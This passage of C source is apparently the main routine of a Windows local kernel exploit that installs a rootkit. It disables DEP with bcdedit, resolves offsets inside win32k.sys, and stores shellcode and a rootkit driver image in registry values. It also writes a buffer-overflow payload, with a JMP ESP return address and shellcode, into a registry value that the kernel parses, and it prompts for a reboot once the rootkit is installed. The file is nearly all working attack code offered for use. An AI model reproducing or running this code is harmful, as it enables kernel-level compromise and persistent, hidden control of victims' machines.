        MessageBox(0, "Rootkit uninstalled!", "SUCCESS", MB_ICONINFORMATION);

        return 0;
    }

    if (argc >= 2 && !strcmp(argv[1], "--dbgbreaks"))
    {
        m_DebugBreaks = TRUE;
    }

    DbgMsg(__FILE__, __LINE__, "[+] Disabling DEP...\n");
    system("bcdedit.exe /set {current} nx AlwaysOff");
    system("bcdedit.exe /set {current} pae ForceEnable");

    DWORD dwShellcodeSize_1 = ScGetSize((PDWORD)Shellcode_1);
    DWORD dwShellcodeSize_2 = ScGetSize((PDWORD)Shellcode_2);
    
    DbgMsg(__FILE__, __LINE__, "[+] 1-st shellcode size is %d bytes\n", dwShellcodeSize_1);
    DbgMsg(__FILE__, __LINE__, "[+] 2-nd shellcode size is %d bytes\n", dwShellcodeSize_2);    

    DWORD offset_UserInitialize = 0;
    DWORD offset_bInitializeEUDC_patch = 0;

    // find unexported functions of win32k, that are needed for exploitation
    if (!AnalyseWin32k(&offset_UserInitialize, &offset_bInitializeEUDC_patch))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: win32k.sys image analysis fails\n");
        goto end;
    }

    GET_KERNEL_PROC_OFFSET(MmIsAddressValid);
    GET_KERNEL_PROC_OFFSET(PsGetCurrentProcess);
    GET_KERNEL_PROC_OFFSET(PsGetProcessWin32Process);    
    GET_KERNEL_PROC_OFFSET(ExAllocatePool);
    GET_KERNEL_PROC_OFFSET(RtlQueryRegistryValues);
    GET_KERNEL_PROC_OFFSET(DbgPrint);

    HKEY hKey;
    LONG Code = RegOpenKey(HKEY_LOCAL_MACHINE, SC2_KEY, &hKey);
    if (Code == ERROR_SUCCESS)
    {
        int Ptr = 0, SignLen = lstrlen(REG_SIGN_FULL);

        UCHAR Buff[SHELLCODE_2_MAX_BUFF_SIZE];
        FillMemory(&Buff, sizeof(Buff), 0x90);            
                    
        for (int i = 0; i <= 16; i++)
        {
            /**
             * Place signatures at different offsets from the 
             * begining of the buffer.
             *
             * kd> s 0x8d000000 Lffffff 0x40 0x50 0x41 0x51 0x90
             *
             */
            memcpy(&Buff[Ptr + i], REG_SIGN_FULL, SignLen);
            Ptr += 16;
        }

        if (SHELLCODE_2_MAX_BUFF_SIZE - (DWORD)Ptr <= dwShellcodeSize_2)
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: Buffer to small\n");
            goto end;
        }

        // copy 2-nd shellcode to the buffer
        memcpy(&Buff[Ptr], Shellcode_2, dwShellcodeSize_2);
        PSC_PARAMS ShellcodeParams = (PSC_PARAMS)(&Buff[Ptr + dwShellcodeSize_2]);
        ZeroMemory(ShellcodeParams, sizeof(SC_PARAMS));

        if (Buff[Ptr] == 0xcc && !m_DebugBreaks)
        {
            // remove debug break
            Buff[Ptr] = 0x90;
        }

        // set constants and parameters for 2-nd shellcode
        ShellcodeParams->offset_MmIsAddressValid = offset_MmIsAddressValid;
        ShellcodeParams->offset_PsGetCurrentProcess = offset_PsGetCurrentProcess;
        ShellcodeParams->offset_PsGetProcessWin32Process = offset_PsGetProcessWin32Process;
        ShellcodeParams->offset_ExAllocatePool = offset_ExAllocatePool;
        ShellcodeParams->offset_RtlQueryRegistryValues = offset_RtlQueryRegistryValues;
        ShellcodeParams->offset_UserInitialize = offset_UserInitialize;
        ShellcodeParams->offset_bInitializeEUDC_patch = offset_bInitializeEUDC_patch;
        ShellcodeParams->rootkit_size = sizeof(rootkit_driver);

#ifdef USE_SHELLCODE_DBGPRINT

        ShellcodeParams->offset_DbgPrint = offset_DbgPrint;
        strcpy_s(ShellcodeParams->szDbgPrintMessage, DBGPRINT_MESSAGE_LEN, DBGPRINT_MESSAGE);

#endif

        DbgMsg(__FILE__, __LINE__, "[+] Saving 2-nd shellcode to \"%s\\%s\"...\n", SC2_KEY, SC2_VAL);

        Code = RegSetValueEx(hKey, SC2_VAL, 0, REG_BINARY, (PBYTE)&Buff, sizeof(Buff));
        if (Code != ERROR_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, "RegSetValueEx() ERROR %d\n", Code);
        }        
        else
        {
            DbgMsg(__FILE__, __LINE__, "[+] SUCCESS\n");
        }

        DbgMsg(__FILE__, __LINE__, "[+] Saving rootkit image to \"%s\\%s\"...\n", SC2_KEY, DRV_VAL);

        Code = RegSetValueEx(hKey, DRV_VAL, 0, REG_BINARY, (PBYTE)&rootkit_driver, sizeof(rootkit_driver));
        if (Code != ERROR_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, "RegSetValueEx() ERROR %d\n", Code);
        }        
        else
        {
            DbgMsg(__FILE__, __LINE__, "[+] SUCCESS\n");
        }

        RegCloseKey(hKey);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "RegOpenKey() ERROR %d\n", Code);
    }

    DWORD dwDataSize = BOF_MIN_LENGTH + dwShellcodeSize_1;
    PVOID pData = malloc(dwDataSize);
    if (pData)
    {
        *(PDWORD)((PUCHAR)pData + BOF_RET_OFFSET) = JMP_ESP_ADDR;        
        memcpy((PUCHAR)pData + BOF_MIN_LENGTH, Shellcode_1, dwShellcodeSize_1);

        if (*((PUCHAR)pData + BOF_MIN_LENGTH) == 0xcc && !m_DebugBreaks)
        {
            // remove debug break
            *((PUCHAR)pData + BOF_MIN_LENGTH) = 0x90;
        }

        ScWriteDword(
            (PUCHAR)pData + BOF_MIN_LENGTH, dwShellcodeSize_1,
            marker_MmIsAddressValid, offset_MmIsAddressValid
        );

        DbgMsg(__FILE__, __LINE__, "[+] Adding malicious data for value \"%s\\%s\"...\n", EXPL_KEY, EXPL_VAL);

        Code = RegOpenKey(HKEY_LOCAL_MACHINE, EXPL_KEY, &hKey);
        if (Code == ERROR_SUCCESS)
        {
            // set malicious value
            Code = RegSetValueEx(hKey, EXPL_VAL, 0, REG_BINARY, (PBYTE)pData, dwDataSize);
            if (Code != ERROR_SUCCESS)
            {
                DbgMsg(__FILE__, __LINE__, "RegSetValueEx() ERROR %d\n", Code);
            }        
            else
            {
                DbgMsg(__FILE__, __LINE__, "[+] SUCCESS\n");

                if (MessageBox(
                    0, 
                    "Rootkit installed, rebot the box now?", 
                    "SUCCESS", 
                    MB_ICONINFORMATION | MB_YESNO) == IDYES)
                {
                    // reboot the system
                    LoadPrivileges(SE_SHUTDOWN_NAME);
                    ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_APPLICATION);
                    return 0;
                }                
            }

            RegCloseKey(hKey);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "RegOpenKey() ERROR %d\n", Code);
        }

        free(pData);
    }

end:
    printf("Press any key to quit...\n");
    _getch();

	return 0;
}
//--------------------------------------------------------------------------------------
// EoF
